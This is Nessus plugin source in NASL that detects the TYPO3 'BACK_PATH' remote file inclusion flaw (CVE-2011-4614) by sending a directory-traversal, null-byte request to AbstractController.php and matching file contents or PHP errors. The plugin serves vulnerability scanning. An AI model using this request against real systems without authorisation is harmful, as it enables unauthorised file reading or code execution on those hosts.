#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(57394);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2015/09/24 23:21:21 $");

  script_cve_id("CVE-2011-4614");
  script_bugtraq_id(51090);
  script_osvdb_id(77776);
  script_xref(name:"EDB-ID", value:"18308");

  script_name(english:"TYPO3 'AbstractController.php' 'BACK_PATH' Parameter Remote File Inclusion");
  script_summary(english:"Attempts to exploit a remote file inclusion vulnerability.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file inclusion vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of TYPO3 installed on the remote host fails to sanitize
user-supplied input to the 'BACK_PATH' parameter of the
'AbstractController.php' script before using it in a PHP
'require_once()' call to include PHP code for execution.

Provided that PHP's 'register_globals' setting is enabled, a remote,
unauthenticated attacker can leverage this vulnerability to read
arbitrary files or execute arbitrary PHP code on the affected host
subject to the privileges under which the web server operates.");
  # http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2011-004/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f60d22ba");
  script_set_attribute(attribute:"solution", value:
"Upgrade to TYPO3 4.5.9 / 4.6.2 or see the TYPO3-CORE-SA-2011-004
advisory for patch information.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"TYPO3 4.5.8/4.6.1 RFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/12/16");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/12/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/12/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:typo3:typo3");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2015 Tenable Network Security, Inc.");

  script_dependencies("typo3_detect.nasl");
  script_require_keys("installed_sw/TYPO3", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "TYPO3";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url = build_url(qs:dir, port:port);

exploit_req = "/typo3/sysext/workspaces/Classes/Controller/AbstractController.php?BACK_PATH=";
exploit_dir_traversal = "../../../../";

file_inclusion_checks = make_array();
file_inclusion_checks['LICENSE.txt'] = "The TYPO3 licensing condition";
file_inclusion_checks['close.html'] = "TYPO3 Script ID: typo3/close.html";

exploitable = FALSE;
verify_url = '';

foreach file (keys(file_inclusion_checks))
{
  url = dir + exploit_req + exploit_dir_traversal + file + "%00";
  res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
  if(
    file + "): failed to open stream: No such file or directory" >< res[2] ||
    file + ") [function.require-once]: failed to open stream: No such file or directory" >< res[2] ||
    file + ") [<a href='function.require-once'>function.require-once</a>]: failed to open stream: No such file or directory" >< res[2] ||

    file + "): failed to open stream: Permission denied" >< res[2] ||
    file + ") [function.require-once]: failed to open stream: Permission denied" >< res[2] ||
    file + ") [<a href='function.require-once'>function.require-once</a>]: failed to open stream: Permission denied" >< res[2] ||

    file + "): failed to open stream: Operation not permitted" >< res[2] ||
    file + ") [function.require-once]: failed to open stream: Operation not permitted" >< res[2] ||
    file + ") [<a href='function.require-once'>function.require-once</a>]: failed to open stream: Operation not permitted" >< res[2] ||

    "Undefined index: BACK_PATH" >< res[2] ||
    file_inclusion_checks[file] >< res[2]
  )
  {
    # were we actually able to include a file?
    if(file_inclusion_checks[file] >< res[2])
    {
      verify_url = url;
      exploitable = TRUE;
      break;
    }
    verify_url = url;
  }
}

if (verify_url == '') audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

if (report_verbosity > 0)
{
  if (exploitable)
    header = "Nessus was able to successfully exploit the vulnerability with\n" +
      "the following request";
  else
    header = "Nessus was able to verify the issue exists, but was unable to\n" +
      "exploit it with the following request (note: register_globals\n" +
      "must be enabled to exploit the vulnerability)";

  report = get_vuln_report(header:header, items:make_list(verify_url), port:port);
  security_warning(port:port, extra:report);
}
else security_warning(port);
